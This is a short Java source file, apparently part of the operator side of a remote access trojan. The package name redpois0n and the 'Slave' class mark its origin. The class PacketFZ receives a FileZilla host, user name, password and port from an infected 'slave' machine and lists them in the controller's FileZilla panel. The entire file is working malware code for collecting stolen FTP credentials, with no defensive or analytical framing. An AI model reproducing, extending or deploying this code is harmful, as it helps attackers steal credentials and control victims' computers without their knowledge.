package com.redpois0n.packets.in;

import java.io.DataInputStream;

import com.redpois0n.Slave;
import com.redpois0n.ui.frames.FrameControlPanel;
import com.redpois0n.ui.panels.PanelControlFileZilla;

public class PacketFZ extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String host = slave.readLine();
		String user = slave.readLine();
		String pass = slave.readLine();
		String port = slave.readLine();

		FrameControlPanel frame = FrameControlPanel.instances.get(slave);
		if (frame != null) {
			PanelControlFileZilla panel = (PanelControlFileZilla) frame.panels.get("filezilla");
			panel.getModel().addRow(new Object[] { host, user, pass, port });
		}
	}

}
